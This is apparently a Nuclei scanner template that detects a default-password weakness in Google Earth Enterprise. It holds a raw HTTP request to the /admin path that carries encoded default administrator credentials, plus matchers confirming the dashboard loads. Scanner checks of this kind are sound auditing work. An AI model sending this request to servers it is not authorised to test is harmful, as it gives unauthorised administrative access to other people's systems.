id: google-earth-enterprise-default-password
info:
  name: Google Earth Enterprise Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Earth Enterprise is the open-source release of Google Earth Enterprise, a geospatial application which provides the ability to build and host custom 3D globes and 2D maps. There exists a default password vulnerability in Google Earth Enterprise. Attackers can exploit this to gain administrative access.
  tags: [default-password]
  reference:
    - https://github.com/google/earthenterprise
http:
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
        Referer: {{BaseURL}}
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Upgrade-Insecure-Requests: 1
        Authorization: Basic Z2VhcGFjaGV1c2VyOmdlZWFkbWlu
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Earth Enterprise Server"
          - "DashboardPanel"
      - type: status
        status:
          - 200
